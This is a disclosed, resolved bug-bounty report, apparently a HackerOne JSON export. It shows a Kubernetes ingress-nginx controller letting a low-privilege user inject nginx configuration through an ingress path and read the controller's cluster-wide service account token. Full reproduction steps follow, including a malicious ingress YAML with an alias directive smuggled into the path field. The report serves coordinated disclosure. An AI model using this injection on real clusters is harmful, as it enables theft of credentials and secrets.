{
  "id": 1382919,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMzgyOTE5",
  "url": "https://hackerone.com/reports/1382919",
  "title": "Ingress-nginx path allows retrieval of ingress-nginx serviceaccount token",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "high",
  "readable_substate": "Resolved",
  "created_at": "2021-10-27T10:37:06.848Z",
  "submitted_at": "2021-10-27T10:37:06.918Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "gaffy",
    "url": "/gaffy",
    "profile_picture_urls": {
      "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
    },
    "is_me?": false,
    "cleared": true,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 39386,
    "url": "https://hackerone.com/kubernetes",
    "handle": "kubernetes",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/039/386/486f4380e09776d05a912ca9f46be23f72fe8197_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/039/386/486f4380e09776d05a912ca9f46be23f72fe8197_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [

    ],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Kubernetes",
      "twitter_handle": "kubernetesio",
      "website": "https://kubernetes.io/",
      "about": ""
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [

  ],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2022-08-06T07:14:09.096Z",
  "bug_reporter_agreed_on_going_public_at": "2022-08-06T07:14:08.987Z",
  "team_member_agreed_on_going_public_at": "2022-07-14T18:10:53.311Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "Report Submission Form\n\n## Summary:\nA user with the permissions to create an ingress resource can obtain the ingress-nginx service account token which can list secrets is all namespaces (cluster wide).\n\n## Kubernetes Version:\n1.20 (should work on (1.21 as well)\n\n## Component Version:\nnginx ingress controller v1.0.4\n\n## Steps To Reproduce:\nI deployed the latest ingress-controller (v1.0.4).\nI used a user (gaf_test) that has the permissions to get, create and update ingress resources\n(the “get” permissions is only to allow kubectl to view the newly created resource).\n\ningress-creator-role.yaml\n```yaml\napiVersion: rbac.authorization.k8s.io/v1\nkind: Role\nmetadata:\n  name: ingress-creator\n  namespace: default\nrules:\n- apiGroups: [\"networking.k8s.io\"]\n  resources: [\"ingresses\"]\n  verbs: [\"get\", \"create\", \"update\"]\n```\n\ningress-creator-role-binding.yaml\n```yaml\napiVersion: rbac.authorization.k8s.io/v1\nkind: RoleBinding\nmetadata:\n  name: gaf_test-ingress-creator-binding\n  namespace: default\nsubjects:\n- kind: User\n  name: gaf_test\n  apiGroup: rbac.authorization.k8s.io\nroleRef:\n  kind: Role\n  name: ingress-creator\n  apiGroup: rbac.authorization.k8s.io\n```\n\nThis user (gaf_user) cannot list secrets at all.\n{F1495367}\n \nUse this user (gaf_user) to create a new ingress resource in the default namespace.\n\ningress.yaml\n```yaml\napiVersion: networking.k8s.io/v1\nkind: Ingress\nmetadata:\n  name: gaf-ingress\n  annotations:\n    kubernetes.io/ingress.class: \"nginx\"\nspec:\n  rules:\n  -  http:\n      paths:\n        - path: /gaf{alias /var/run/secrets/kubernetes.io/serviceaccount/;}location ~* ^/aaa\n          pathType: Prefix\n          backend:\n            service:\n              name: some-service\n              port:\n                number: 5678\n```\n```\nkubectl apply -f ingress.yaml\n```\n{F1495369}\n \n\nAccess to nginx ingress loadbalancer to /gaf/token path.\n\nhttps://<host>/gaf/token\n\n {F1495370}\n\nDecode the token to see it belongs to the ingress-nginx\n{F1495372}\n \nThe nginx-ingress service account is bound to the nginx-ingress cluser role that can list secrets in all namespaces.\n\n## The Root Cause\nWhen a user creates an ingress resource, the new configuration is updated in the /etc/nginx/nginx.conf file in the ingress-nginx-controller pod located in the nginx-ingress namespace.\nI caused a “config file injection” using the following payload as path:\n\n**/gaf{alias /var/run/secrets/kubernetes.io/serviceaccount/;}location ~* ^/aaa**\nThe payload above creates the following configuration for nginx:\n\n/etc/nginx/nginx.conf\n\n{F1495371} \n\nThis is the relevant part from the configuration which creates a new route to /gaf path and uses an alias (http://nginx.org/en/docs/http/ngx_http_core_module.html#alias)\nthat maps to /var/run/secrets/kubernetes.io/serviceaccount/ directory on the ingress-nginx-controller pod.\n\n## Impact\n\nA user with the permissions to create an ingress resource can obtain the ingress-nginx service account token which can list secrets is all namespaces (cluster wide).",
  "bounty_amount": "2500.0",
  "formatted_bounty": "$2,500",
  "weakness": {
    "id": 75,
    "name": "Privilege Escalation"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [
    {
      "id": 1495367,
      "file_name": "get-secrets-test.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/b1y0d4yznhbu5zzkzaw86y5tbp56?response-content-disposition=attachment%3B%20filename%3D%22get-secrets-test.png%22%3B%20filename%2A%3DUTF-8%27%27get-secrets-test.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQQM3U3QWN%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T070111Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQC8AS0gj74xLCqoISG6HxbEYSI0PEfdF96wfaJ9XQRYXAIhANMJJf7iKjV7IKfTVUDY%2FFCPGSxnhIyV8N48256%2BMYR9KrEFCCMQAxoMMDEzNjE5Mjc0ODQ5Igxhj6IY2dpHIu8rk%2FQqjgVrs6hBhGYkbRpwnTMlcXODs%2BzBfQF20UuznJ4WeEETbBCS5xrQKwNciUh8fTXTf3AeLW8ma7i6nN2J%2FTPJmdDJep9LOqCCNnNfoot3TxHeog3PIzq8bBqzv%2FWnZ6WZiSTCgT0fRuUO%2F0NoLfCI2HO7HAJbzDCBBPLDbovCdCCec9tOhSCo4zeTxGL%2B5eNFzvxdrScMsFkSDHqK1nYzB%2BNHu67VcVBNgokTZ%2FiE0D5F2UMHD7Q41spCK9XBNhkLLcYkYcOLSZPgh0y0%2BhAqiB%2F5M75rvi%2FwL4GzjvstCuMp7%2BMlU5uW0LxRNU4av%2Fnf1lTfZJBbJdVp7t47cyPMsPTAh8YfP7rASoDKsUHiH%2BFUgz23qjds1QkLL5EbNJyfMeGE%2BXtoslgNninHIYEKrR5ds5PZuyrZzZMTDLF%2Fh1nIMmJ5vq2TjJfh421jqFfaYQ9GW34apWkiqGr0hGH8SptwKhv4intOnjJEMXalYWlbtl1Pzp1BC18KUB2I%2FxBURyEaaUVKRBbvabpkEgXV%2FnQqzWJTjCL5HnMD4ljLJgc%2BWfWt1Q1EKcMewZWvcY5%2By7QeV5XQIye%2F0GmL5eIhaBkMGzga%2B%2BT%2Btd2hzvF%2BJzR2we9VQYubOGxpQQuF9r%2FV8wkrGgx3sAX8Zd2QX8ckdW6pg1Klcdh7SLABopVWthPu4QV7L3BabFZmhQUAZxdk0ekb1%2Fw1u8af%2Fr51748Lwtjkx8eOWD49jDTLn6Xt0mW91m5QJ4eaq4%2FNmdjUMwnuXKlgK8ZooXSz0KzkvnZ9T%2F7ULiIfcJCltTowwu8hMBaBndUsJxqBhc8BqU6f%2BkchljSoaUmROWNJOFB0Hq9gD7TyVdCAdV0rFjpJkF%2Bqsjsw2Ym5qAY6sAF%2B%2FtGSYZrDIqtpyxX4SjQXtSTuGpkpw2NJ5IoQLX1kapRTuos3cgYmRQqD2osbXW8GAYux38XCyjB7nnsQGwJ0JEKqlWKQK6b0%2FrXO6AT6H0SgoF4kOVUPnUFGdGx5WY2LMvGJ%2FMBV8%2BSm%2FBqOEyct%2F4MP9bhaeuzEeKXirmXTi9G37p059sF1j%2Fald6zrk2x03j7jMV76l15cHOy6ntmTDUBjHYJB0MZDtEpHFj1bVg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=3796aa8a716c32a04a348ead4a2f1faeeed631f2e49e3e4be57b10441cfc40a6",
      "file_size": 9528,
      "type": "image/png",
      "moderated": null
    },
    {
      "id": 1495369,
      "file_name": "apply.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/q0lwsjc8qfc2xjfxwgquox26tg4f?response-content-disposition=attachment%3B%20filename%3D%22apply.png%22%3B%20filename%2A%3DUTF-8%27%27apply.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQQM3U3QWN%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T070111Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQC8AS0gj74xLCqoISG6HxbEYSI0PEfdF96wfaJ9XQRYXAIhANMJJf7iKjV7IKfTVUDY%2FFCPGSxnhIyV8N48256%2BMYR9KrEFCCMQAxoMMDEzNjE5Mjc0ODQ5Igxhj6IY2dpHIu8rk%2FQqjgVrs6hBhGYkbRpwnTMlcXODs%2BzBfQF20UuznJ4WeEETbBCS5xrQKwNciUh8fTXTf3AeLW8ma7i6nN2J%2FTPJmdDJep9LOqCCNnNfoot3TxHeog3PIzq8bBqzv%2FWnZ6WZiSTCgT0fRuUO%2F0NoLfCI2HO7HAJbzDCBBPLDbovCdCCec9tOhSCo4zeTxGL%2B5eNFzvxdrScMsFkSDHqK1nYzB%2BNHu67VcVBNgokTZ%2FiE0D5F2UMHD7Q41spCK9XBNhkLLcYkYcOLSZPgh0y0%2BhAqiB%2F5M75rvi%2FwL4GzjvstCuMp7%2BMlU5uW0LxRNU4av%2Fnf1lTfZJBbJdVp7t47cyPMsPTAh8YfP7rASoDKsUHiH%2BFUgz23qjds1QkLL5EbNJyfMeGE%2BXtoslgNninHIYEKrR5ds5PZuyrZzZMTDLF%2Fh1nIMmJ5vq2TjJfh421jqFfaYQ9GW34apWkiqGr0hGH8SptwKhv4intOnjJEMXalYWlbtl1Pzp1BC18KUB2I%2FxBURyEaaUVKRBbvabpkEgXV%2FnQqzWJTjCL5HnMD4ljLJgc%2BWfWt1Q1EKcMewZWvcY5%2By7QeV5XQIye%2F0GmL5eIhaBkMGzga%2B%2BT%2Btd2hzvF%2BJzR2we9VQYubOGxpQQuF9r%2FV8wkrGgx3sAX8Zd2QX8ckdW6pg1Klcdh7SLABopVWthPu4QV7L3BabFZmhQUAZxdk0ekb1%2Fw1u8af%2Fr51748Lwtjkx8eOWD49jDTLn6Xt0mW91m5QJ4eaq4%2FNmdjUMwnuXKlgK8ZooXSz0KzkvnZ9T%2F7ULiIfcJCltTowwu8hMBaBndUsJxqBhc8BqU6f%2BkchljSoaUmROWNJOFB0Hq9gD7TyVdCAdV0rFjpJkF%2Bqsjsw2Ym5qAY6sAF%2B%2FtGSYZrDIqtpyxX4SjQXtSTuGpkpw2NJ5IoQLX1kapRTuos3cgYmRQqD2osbXW8GAYux38XCyjB7nnsQGwJ0JEKqlWKQK6b0%2FrXO6AT6H0SgoF4kOVUPnUFGdGx5WY2LMvGJ%2FMBV8%2BSm%2FBqOEyct%2F4MP9bhaeuzEeKXirmXTi9G37p059sF1j%2Fald6zrk2x03j7jMV76l15cHOy6ntmTDUBjHYJB0MZDtEpHFj1bVg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=a19657b86bc56f0aff86a3c081963da4d4ad5b93ed40e25f1496293dd0351b37",
      "file_size": 5087,
      "type": "image/png",
      "moderated": null
    },
    {
      "id": 1495370,
      "file_name": "token-bro.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/yjda4a57eo6zkmnn0nevjmnqq0nq?response-content-disposition=attachment%3B%20filename%3D%22token-bro.png%22%3B%20filename%2A%3DUTF-8%27%27token-bro.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQQM3U3QWN%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T070111Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQC8AS0gj74xLCqoISG6HxbEYSI0PEfdF96wfaJ9XQRYXAIhANMJJf7iKjV7IKfTVUDY%2FFCPGSxnhIyV8N48256%2BMYR9KrEFCCMQAxoMMDEzNjE5Mjc0ODQ5Igxhj6IY2dpHIu8rk%2FQqjgVrs6hBhGYkbRpwnTMlcXODs%2BzBfQF20UuznJ4WeEETbBCS5xrQKwNciUh8fTXTf3AeLW8ma7i6nN2J%2FTPJmdDJep9LOqCCNnNfoot3TxHeog3PIzq8bBqzv%2FWnZ6WZiSTCgT0fRuUO%2F0NoLfCI2HO7HAJbzDCBBPLDbovCdCCec9tOhSCo4zeTxGL%2B5eNFzvxdrScMsFkSDHqK1nYzB%2BNHu67VcVBNgokTZ%2FiE0D5F2UMHD7Q41spCK9XBNhkLLcYkYcOLSZPgh0y0%2BhAqiB%2F5M75rvi%2FwL4GzjvstCuMp7%2BMlU5uW0LxRNU4av%2Fnf1lTfZJBbJdVp7t47cyPMsPTAh8YfP7rASoDKsUHiH%2BFUgz23qjds1QkLL5EbNJyfMeGE%2BXtoslgNninHIYEKrR5ds5PZuyrZzZMTDLF%2Fh1nIMmJ5vq2TjJfh421jqFfaYQ9GW34apWkiqGr0hGH8SptwKhv4intOnjJEMXalYWlbtl1Pzp1BC18KUB2I%2FxBURyEaaUVKRBbvabpkEgXV%2FnQqzWJTjCL5HnMD4ljLJgc%2BWfWt1Q1EKcMewZWvcY5%2By7QeV5XQIye%2F0GmL5eIhaBkMGzga%2B%2BT%2Btd2hzvF%2BJzR2we9VQYubOGxpQQuF9r%2FV8wkrGgx3sAX8Zd2QX8ckdW6pg1Klcdh7SLABopVWthPu4QV7L3BabFZmhQUAZxdk0ekb1%2Fw1u8af%2Fr51748Lwtjkx8eOWD49jDTLn6Xt0mW91m5QJ4eaq4%2FNmdjUMwnuXKlgK8ZooXSz0KzkvnZ9T%2F7ULiIfcJCltTowwu8hMBaBndUsJxqBhc8BqU6f%2BkchljSoaUmROWNJOFB0Hq9gD7TyVdCAdV0rFjpJkF%2Bqsjsw2Ym5qAY6sAF%2B%2FtGSYZrDIqtpyxX4SjQXtSTuGpkpw2NJ5IoQLX1kapRTuos3cgYmRQqD2osbXW8GAYux38XCyjB7nnsQGwJ0JEKqlWKQK6b0%2FrXO6AT6H0SgoF4kOVUPnUFGdGx5WY2LMvGJ%2FMBV8%2BSm%2FBqOEyct%2F4MP9bhaeuzEeKXirmXTi9G37p059sF1j%2Fald6zrk2x03j7jMV76l15cHOy6ntmTDUBjHYJB0MZDtEpHFj1bVg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=ecc41cf4475e65d1949aed3811c052a07853bc3db45f7940a3ecd27dc4375680",
      "file_size": 23256,
      "type": "image/png",
      "moderated": null
    },
    {
      "id": 1495371,
      "file_name": "injected-nginx-conf.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/xvouz4m46r1gnf3tvr696li0ck9f?response-content-disposition=attachment%3B%20filename%3D%22injected-nginx-conf.png%22%3B%20filename%2A%3DUTF-8%27%27injected-nginx-conf.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQQM3U3QWN%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T070111Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQC8AS0gj74xLCqoISG6HxbEYSI0PEfdF96wfaJ9XQRYXAIhANMJJf7iKjV7IKfTVUDY%2FFCPGSxnhIyV8N48256%2BMYR9KrEFCCMQAxoMMDEzNjE5Mjc0ODQ5Igxhj6IY2dpHIu8rk%2FQqjgVrs6hBhGYkbRpwnTMlcXODs%2BzBfQF20UuznJ4WeEETbBCS5xrQKwNciUh8fTXTf3AeLW8ma7i6nN2J%2FTPJmdDJep9LOqCCNnNfoot3TxHeog3PIzq8bBqzv%2FWnZ6WZiSTCgT0fRuUO%2F0NoLfCI2HO7HAJbzDCBBPLDbovCdCCec9tOhSCo4zeTxGL%2B5eNFzvxdrScMsFkSDHqK1nYzB%2BNHu67VcVBNgokTZ%2FiE0D5F2UMHD7Q41spCK9XBNhkLLcYkYcOLSZPgh0y0%2BhAqiB%2F5M75rvi%2FwL4GzjvstCuMp7%2BMlU5uW0LxRNU4av%2Fnf1lTfZJBbJdVp7t47cyPMsPTAh8YfP7rASoDKsUHiH%2BFUgz23qjds1QkLL5EbNJyfMeGE%2BXtoslgNninHIYEKrR5ds5PZuyrZzZMTDLF%2Fh1nIMmJ5vq2TjJfh421jqFfaYQ9GW34apWkiqGr0hGH8SptwKhv4intOnjJEMXalYWlbtl1Pzp1BC18KUB2I%2FxBURyEaaUVKRBbvabpkEgXV%2FnQqzWJTjCL5HnMD4ljLJgc%2BWfWt1Q1EKcMewZWvcY5%2By7QeV5XQIye%2F0GmL5eIhaBkMGzga%2B%2BT%2Btd2hzvF%2BJzR2we9VQYubOGxpQQuF9r%2FV8wkrGgx3sAX8Zd2QX8ckdW6pg1Klcdh7SLABopVWthPu4QV7L3BabFZmhQUAZxdk0ekb1%2Fw1u8af%2Fr51748Lwtjkx8eOWD49jDTLn6Xt0mW91m5QJ4eaq4%2FNmdjUMwnuXKlgK8ZooXSz0KzkvnZ9T%2F7ULiIfcJCltTowwu8hMBaBndUsJxqBhc8BqU6f%2BkchljSoaUmROWNJOFB0Hq9gD7TyVdCAdV0rFjpJkF%2Bqsjsw2Ym5qAY6sAF%2B%2FtGSYZrDIqtpyxX4SjQXtSTuGpkpw2NJ5IoQLX1kapRTuos3cgYmRQqD2osbXW8GAYux38XCyjB7nnsQGwJ0JEKqlWKQK6b0%2FrXO6AT6H0SgoF4kOVUPnUFGdGx5WY2LMvGJ%2FMBV8%2BSm%2FBqOEyct%2F4MP9bhaeuzEeKXirmXTi9G37p059sF1j%2Fald6zrk2x03j7jMV76l15cHOy6ntmTDUBjHYJB0MZDtEpHFj1bVg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=9b958ef9c42643edc727fb2bd2eee956ff509e393e689b8924fe258cffa855ce",
      "file_size": 133792,
      "type": "image/png",
      "moderated": null
    },
    {
      "id": 1495372,
      "file_name": "ingress-nginx-serviceaccount-token.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/75kj85nxsrlid96s4f6ko68hb52e?response-content-disposition=attachment%3B%20filename%3D%22ingress-nginx-serviceaccount-token.png%22%3B%20filename%2A%3DUTF-8%27%27ingress-nginx-serviceaccount-token.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQQM3U3QWN%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T070111Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQC8AS0gj74xLCqoISG6HxbEYSI0PEfdF96wfaJ9XQRYXAIhANMJJf7iKjV7IKfTVUDY%2FFCPGSxnhIyV8N48256%2BMYR9KrEFCCMQAxoMMDEzNjE5Mjc0ODQ5Igxhj6IY2dpHIu8rk%2FQqjgVrs6hBhGYkbRpwnTMlcXODs%2BzBfQF20UuznJ4WeEETbBCS5xrQKwNciUh8fTXTf3AeLW8ma7i6nN2J%2FTPJmdDJep9LOqCCNnNfoot3TxHeog3PIzq8bBqzv%2FWnZ6WZiSTCgT0fRuUO%2F0NoLfCI2HO7HAJbzDCBBPLDbovCdCCec9tOhSCo4zeTxGL%2B5eNFzvxdrScMsFkSDHqK1nYzB%2BNHu67VcVBNgokTZ%2FiE0D5F2UMHD7Q41spCK9XBNhkLLcYkYcOLSZPgh0y0%2BhAqiB%2F5M75rvi%2FwL4GzjvstCuMp7%2BMlU5uW0LxRNU4av%2Fnf1lTfZJBbJdVp7t47cyPMsPTAh8YfP7rASoDKsUHiH%2BFUgz23qjds1QkLL5EbNJyfMeGE%2BXtoslgNninHIYEKrR5ds5PZuyrZzZMTDLF%2Fh1nIMmJ5vq2TjJfh421jqFfaYQ9GW34apWkiqGr0hGH8SptwKhv4intOnjJEMXalYWlbtl1Pzp1BC18KUB2I%2FxBURyEaaUVKRBbvabpkEgXV%2FnQqzWJTjCL5HnMD4ljLJgc%2BWfWt1Q1EKcMewZWvcY5%2By7QeV5XQIye%2F0GmL5eIhaBkMGzga%2B%2BT%2Btd2hzvF%2BJzR2we9VQYubOGxpQQuF9r%2FV8wkrGgx3sAX8Zd2QX8ckdW6pg1Klcdh7SLABopVWthPu4QV7L3BabFZmhQUAZxdk0ekb1%2Fw1u8af%2Fr51748Lwtjkx8eOWD49jDTLn6Xt0mW91m5QJ4eaq4%2FNmdjUMwnuXKlgK8ZooXSz0KzkvnZ9T%2F7ULiIfcJCltTowwu8hMBaBndUsJxqBhc8BqU6f%2BkchljSoaUmROWNJOFB0Hq9gD7TyVdCAdV0rFjpJkF%2Bqsjsw2Ym5qAY6sAF%2B%2FtGSYZrDIqtpyxX4SjQXtSTuGpkpw2NJ5IoQLX1kapRTuos3cgYmRQqD2osbXW8GAYux38XCyjB7nnsQGwJ0JEKqlWKQK6b0%2FrXO6AT6H0SgoF4kOVUPnUFGdGx5WY2LMvGJ%2FMBV8%2BSm%2FBqOEyct%2F4MP9bhaeuzEeKXirmXTi9G37p059sF1j%2Fald6zrk2x03j7jMV76l15cHOy6ntmTDUBjHYJB0MZDtEpHFj1bVg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=0511c0ee2730d87d45143bc50de70e249d66b4745eead0be456de57f68355cdd",
      "file_size": 54316,
      "type": "image/png",
      "moderated": null
    }
  ],
  "allow_singular_disclosure_at": "2022-08-13T18:10:53.412Z",
  "allow_singular_disclosure_after": -35038218.12494439,
  "singular_disclosure_allowed": true,
  "vote_count": 17,
  "voters": [
    "n1m0",
    "a_d_a_m",
    "dexter0us",
    "zy9ard3",
    "yassinek3ch",
    "akashsky",
    "13370verride",
    "hotmuffin",
    "shivammusic",
    "bugdetector",
    "and 7 more..."
  ],
  "severity": {
    "rating": "high",
    "score": 7.6,
    "author_type": "User",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "low",
      "privileges_required": "low",
      "user_interaction": "none",
      "scope": "unchanged",
      "confidentiality": "high",
      "integrity": "low",
      "availability": "low"
    }
  },
  "structured_scope": {
    "databaseId": 32524,
    "asset_type": "SOURCE_CODE",
    "asset_identifier": "https://github.com/kubernetes/ingress-nginx",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [

    ],
    "assignable_team_member_groups": [

    ]
  },
  "activities": [
    {
      "id": 14073761,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "I submitted this vulnerability to security@kubernetes.io on Sunday, 24 October 2021.\nAn email I received back requested to mention it in this report so it will not be marked as a duplicate.",
      "automated_response": false,
      "created_at": "2021-10-27T10:42:18.769Z",
      "updated_at": "2021-10-27T10:42:18.769Z",
      "actor": {
        "username": "gaffy",
        "cleared": true,
        "verified": true,
        "url": "/gaffy",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "kubernetes"
    },
    {
      "id": 14120919,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Hi @gaffy,\n\nThank you for your submission. I hope you are well. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.\n\nHave a great day! \n\nKind regards,\n@princeofpersia",
      "automated_response": false,
      "created_at": "2021-10-31T06:44:19.043Z",
      "updated_at": "2021-10-31T06:44:19.043Z",
      "actor": {
        "username": "h1_analyst_oliver",
        "cleared": false,
        "verified": false,
        "url": "/h1_analyst_oliver",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/663/153/2664a34113403db9945207030f723e4f93a511b0_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "hackerone_triager": true,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "kubernetes"
    },
    {
      "id": 14120925,
      "is_internal": false,
      "editable": false,
      "type": "Activities::BugNeedsMoreInfo",
      "message": "Hi @gaffy,\n\nThanks for your report!\n\nCan you provide the full commands you used to create the environment and to install and configure Ingress, we need to replicate your testing environment to reproduce the report.\n\nRegards,\n@princeofpersia",
      "automated_response": false,
      "created_at": "2021-10-31T06:46:03.576Z",
      "updated_at": "2021-10-31T06:46:03.576Z",
      "actor": {
        "username": "h1_analyst_oliver",
        "cleared": false,
        "verified": false,
        "url": "/h1_analyst_oliver",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/663/153/2664a34113403db9945207030f723e4f93a511b0_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "hackerone_triager": true,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "kubernetes"
    },
    {
      "id": 14122229,
      "is_internal": false,
      "editable": false,
      "type": "Activities::BugNew",
      "message": "Sure.\n\nEnvironment Installation:\n1. I created a k8s cluster in AWS (using EKS). Kubernetes version = 1.20 (should work on latest as well)\n2. I installed nginx-ingress-controller using the following command:\n```\nkubectl apply -f https://raw.githubusercontent.com/kubernetes/ingress-nginx/controller-v1.0.4/deploy/static/provider/cloud/deploy.yaml\n```\n\nCreate a user with limited permissions:\n1. Since I used AWS EKS, I created an AWS IAM user (gaf_test) and edited the aws-auth config file in kube-system namespace.\n```\nkubectl edit configmap aws-auth -n kube-system\n```\nHere is the final aws-auth configmap (added lines 10-11):\n```yaml\napiVersion: v1\ndata:\n  mapRoles: |\n    - groups:\n      - system:bootstrappers\n      - system:nodes\n      rolearn: arn:aws:iam::XXX:role/XXX\n      username: system:node:{{EC2PrivateDNSName}}\n  mapUsers: |\n    - userarn: arn:aws:iam::XXX:user/gaf_test\n      username: gaf_test\nkind: ConfigMap\nmetadata:\n  creationTimestamp: XXX\n  name: aws-auth\n  namespace: kube-system\n  resourceVersion: XXX\n  uid: XXX\n```\n2. Now we need to give this user the limited permissions to create an ingress resource using role and role binding.\n\ningress-creator-role.yaml\n\n```yaml\napiVersion: rbac.authorization.k8s.io/v1\nkind: Role\nmetadata:\n  name: ingress-creator\n  namespace: default\nrules:\n- apiGroups: [\"networking.k8s.io\"]\n  resources: [\"ingresses\"]\n  verbs: [\"get\", \"create\", \"update\"]\n```\nRun: ```kubectl apply -f ingress-creator-role.yaml```\n\ningress-creator-role-binding.yaml\n\n```yaml\napiVersion: rbac.authorization.k8s.io/v1\nkind: RoleBinding\nmetadata:\n  name: gaf_test-ingress-creator-binding\n  namespace: default\nsubjects:\n- kind: User\n  name: gaf_test\n  apiGroup: rbac.authorization.k8s.io\nroleRef:\n  kind: Role\n  name: ingress-creator\n  apiGroup: rbac.authorization.k8s.io\n```\nRun: ```kubectl apply -f ingress-creator-role-binding.yaml```\n\nSwitch to new user (with the limited permissions). In my example it is gaf_test.\nSince I'm using AWS I switch to gaf_test user context in the terminal by exporting its credentials to the environment variables.\n```\nexport AWS_ACCESS_KEY_ID=<gaf_test-aws-access-key-id>\nexport AWS_SECRET_ACCESS_KEY=<gaf_test-aws-secret-access-key>\nexport AWS_DEFAULT_REGION=<region>\n```\nTo ensure I'm in gaf_test context I tried to list secrets or get pods (and couldn't). \n\nCreate malicious Ingress and obtain the token of nginx-ingress service account:\n1. Use the new user (gaf_test) to create a new ingress resource in the default namespace.\n\ningress.yaml\n```yaml\napiVersion: networking.k8s.io/v1\nkind: Ingress\nmetadata:\n  name: gaf-ingress\n  annotations:\n    kubernetes.io/ingress.class: \"nginx\"\nspec:\n  rules:\n  -  http:\n      paths:\n        - path: /gaf{alias /var/run/secrets/kubernetes.io/serviceaccount/;}location ~* ^/aaa\n          pathType: Prefix\n          backend:\n            service:\n              name: some-service\n              port:\n                number: 5678\n```\nRun: ```kubectl apply -f ingress.yaml```\n\n2. To view the newly created ingress run ```kubectl get ing gaf-ingress```. \nWait util you see the load balancer address under the ADDRESS column. \n\n3. Browse to http://<ADDRESS>/gaf/token",
      "automated_response": false,
      "created_at": "2021-10-31T09:40:25.108Z",
      "updated_at": "2021-10-31T09:44:41.540Z",
      "actor": {
        "username": "gaffy",
        "cleared": true,
        "verified": true,
        "url": "/gaffy",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "kubernetes"
    },
